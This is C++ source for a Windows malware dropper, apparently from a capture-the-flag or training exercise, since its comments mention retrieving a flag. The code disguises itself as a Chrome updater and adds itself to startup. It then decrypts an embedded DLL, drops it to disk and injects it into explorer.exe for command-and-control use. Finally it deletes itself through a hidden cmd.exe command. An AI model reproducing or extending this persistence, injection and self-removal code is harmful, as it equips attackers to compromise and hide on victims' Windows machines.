#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING 1

#include <string>
#include <codecvt>
#include <locale>
#include <Windows.h>
#include <strsafe.h>

#include "move.h"
#include "StartupAdder.h"
#include "dll_decryptor.h"
#include "Writer.h"
#include "injector.h"

// Move executable to different path "C:\Users\Default\AppData\Roaming\Google\Chrome\updater.exe"
// Add yourself to startup 
// Drop DLL to system
// inject dropped dll to explorer.exe
    // establish connection with C&C server
    // get command from server (e.g. copy file). With encrypted command get flag (encrypted)
// delete dropper

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void self_destruct()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

int main(int argc, const char** argv)
{
	std::string path = "C:\\Users\\Default\\AppData\\Roaming\\Google\\Chrome\\";
	std::string dll_name = "update_agent.dll";
	// copy file to directory
	TCHAR pBuf[MAX_PATH];
	GetModuleFileName(NULL, pBuf, MAX_PATH);

//	if (Move::copy_file(pBuf, std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(path)))
//	{
//		return 1;
//	}

	// add yourself to startup
	std::string exe_name = std::string(argv[0]).substr(std::string(argv[0]).rfind('\\') + 1, std::string(argv[0]).size() - 1);
	StartupAdder::add(exe_name.substr(0, exe_name.size() - 4), path + exe_name);

	// Decrypt DLL
	// std::vector <BYTE> enc_dll = DllDecryptor::encrypt_dll(&DllData::raw_dll);
	DllData dlldata;
	std::vector <BYTE> plain_dll = DllDecryptor::decrypt_dll(dlldata.raw_dll);

	// Drop Dll
	if (Writer::write(path + dll_name, { &plain_dll }))
		return 1;

	// inject_dll();
	if (Injector::inject_dll(L"explorer.exe", path + dll_name))
		return 1;

	return 0;
}